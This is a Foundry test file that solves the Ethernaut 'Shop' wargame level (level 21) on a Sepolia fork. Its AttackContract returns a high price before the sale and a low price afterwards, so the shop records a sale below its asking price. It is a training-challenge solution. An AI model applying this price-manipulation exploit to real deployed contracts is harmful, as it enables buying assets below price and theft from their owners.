// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/21-Shop/Shop.sol";

contract ContractTest is Test {
    Shop level21 = Shop(payable(0x72f7aBfaBfe41103566b49886897911Cb5C53066));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x72f7aBfaBfe41103566b49886897911Cb5C53066),
            "Ethernaut21"
        );
    }

    function testEthernaut21() public {
        AttackContract attacker = new AttackContract();
        attacker.trigger();
        assert(level21.isSold() == true);
    }

    receive() external payable {}
}

contract AttackContract {
    Shop level21 = Shop(payable(0x72f7aBfaBfe41103566b49886897911Cb5C53066));

    uint256 counter = 0;

    function trigger() public {
        level21.buy();
    }

    function price() public view returns (uint256) {
        if (level21.isSold() == false) {
            return 100;
        } else {
            return 10;
        }
    }

    receive() external payable {}
}
